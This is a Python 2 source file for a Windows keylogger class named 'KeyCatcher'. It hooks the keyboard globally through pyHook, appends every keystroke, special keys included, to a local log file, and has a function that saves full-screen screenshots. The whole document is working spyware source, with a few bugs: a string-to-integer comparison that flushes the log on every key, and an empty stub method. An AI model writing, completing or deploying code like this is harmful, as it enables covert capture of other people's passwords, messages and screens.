import pyHook
import pythoncom
from multiprocessing import Process
import os
from win32api import GetSystemMetrics
from ctypes import windll
import pyautogui


SCREEN_WIDTH = GetSystemMetrics(0)
SCREEN_HEIGHT = GetSystemMetrics(1)


class KeyCatcher:
    def __init__(self):
        self.current_path = os.path.dirname(os.path.realpath(__file__))
        self.screen_shot_path=self.current_path+""
        self.data = ""
        self.data_file = "data_file.log"
        # create a hook manager
        self.hm = pyHook.HookManager()
    def set_screen_shot_path(self):
        pass
    def set_data_file(self, data_file):
        self.data_file = data_file
        self.__ready_data_file()

    def __ready_data_file(self):
        """
        if no data file exists create a new one
        """
        if not os.path.exists(self.data_file):
            with open(self.data_file, "w+") as f:
                pass

    def set_key_hook(self):
        # watch for events
        self.hm.KeyDown = self.key_press
        # set the hook
        self.hm.HookKeyboard()

    def update_data_file(self):
        self.__ready_data_file()
        with open(self.data_file, "a") as data_file:
            data_file.write(self.data)
        self.data = ""

    def key_press(self, event):
        print 'MessageName:', event.MessageName
        print 'Message:', event.Message
        print 'Time:', event.Time
        print 'Window:', event.Window
        print 'WindowName:', event.WindowName
        print 'Ascii:', event.Ascii, chr(event.Ascii)
        print 'Key:', event.Key
        print 'KeyID:', event.KeyID
        print 'ScanCode:', event.ScanCode
        print 'Extended:', event.Extended
        print 'Injected:', event.Injected
        print 'Alt', event.Alt
        print 'Transition', event.Transition
        print '---'
        # catch special keys (such as ctrl, back...)
        if event.Ascii == 0:
            self.data += "(-%s-)" % event.Key
        else:
            self.data += event.Key
        if self.data > 100:
            self.update_data_file()
        # return True to pass the event to other handlers
        return True

    def take_screen_shot(self):
        user32 = windll.user32
        user32.SetProcessDPIAware()
        screen_shot = pyautogui.grab(region=(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
        save_path = "MySnapshot.jpg"
        screen_shot.save(save_path)